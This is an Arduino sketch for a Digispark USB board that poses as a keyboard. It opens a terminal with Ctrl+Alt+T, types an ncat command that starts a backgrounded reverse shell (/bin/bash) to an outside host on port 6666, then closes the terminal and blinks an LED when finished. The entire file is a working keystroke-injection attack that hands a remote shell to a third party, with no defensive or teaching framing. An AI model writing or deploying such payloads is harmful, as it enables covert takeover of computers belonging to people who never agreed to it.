#include "DigiKeyboardDe.h"

void setup() 
{
  pinMode(1, OUTPUT); //LED on Model A 
  DigiKeyboardDe.update();
  DigiKeyboardDe.delay(600);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
  DigiKeyboardDe.delay(200);
  DigiKeyboardDe.println("ncat quantumworlds.de 6666 -e /bin/bash &");
  DigiKeyboardDe.delay(100);
  DigiKeyboardDe.println("exit");
  
}

void loop() 
{ 
  //LED blinken wenn fertig...
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(200);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(200);
}
